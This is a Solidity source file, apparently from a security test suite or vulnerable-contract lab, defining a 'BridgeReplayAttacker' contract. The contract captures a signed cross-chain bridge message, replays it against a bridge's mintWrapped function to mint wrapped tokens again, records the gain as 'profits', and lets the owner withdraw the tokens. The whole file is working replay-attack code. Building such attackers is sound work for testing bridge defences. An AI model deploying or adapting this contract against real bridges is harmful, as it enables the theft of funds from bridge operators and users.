// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../interfaces/IERC20Minimal.sol";

interface IVulnerableBridge {
    function mintWrapped(bytes calldata message, bytes calldata signature) external;
}

contract BridgeReplayAttacker {
    address public owner;
    bytes public capturedMessage;
    uint256 public profits;
    address public capturedToken;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function captureMessage(bytes memory message) external onlyOwner {
        capturedMessage = message;
    }

    function replayMessage(address bridge, bytes memory signature) external onlyOwner {
        (address token,,) = abi.decode(capturedMessage, (address, uint256, address));
        capturedToken = token;
        uint256 before = IERC20Minimal(token).balanceOf(address(this));
        IVulnerableBridge(bridge).mintWrapped(capturedMessage, signature);
        uint256 afterBal = IERC20Minimal(token).balanceOf(address(this));
        if (afterBal > before) {
            profits += afterBal - before;
        }
    }

    function getProfits() external view returns (uint256) {
        return profits;
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(owner, amount);
    }
}
